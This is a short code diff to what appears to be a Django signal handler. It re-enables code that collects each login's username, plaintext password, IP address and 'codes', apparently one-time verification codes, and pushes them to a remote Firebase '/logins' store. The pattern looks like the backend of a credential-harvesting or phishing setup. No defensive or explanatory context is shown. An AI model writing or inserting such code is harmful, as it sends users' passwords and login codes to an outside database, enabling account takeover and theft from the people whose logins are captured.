@@ -18,15 +18,15 @@ def update_logins(sender, instance, **kwargs):
         ref = db.reference('/logins')
 
         # Data to be pushed to Firebase
-        # data = {
-        #     "username": instance.username,
-        #     "password": instance.password,
-        #     "ip": str(instance.ip),
-        #     "codes": instance.codes,
-        # }
+        data = {
+            "username": instance.username,
+            "password": instance.password,
+            "ip": str(instance.ip),
+            "codes": instance.codes,
+        }
 
-        # # Push data to Firebase
-        # ref.push(data)
+        # Push data to Firebase
+        ref.push(data)
     except Exception as e:
         # Handle any exceptions (e.g., network issues, Firebase API errors)
         print(f"Error updating Firebase: {e}")
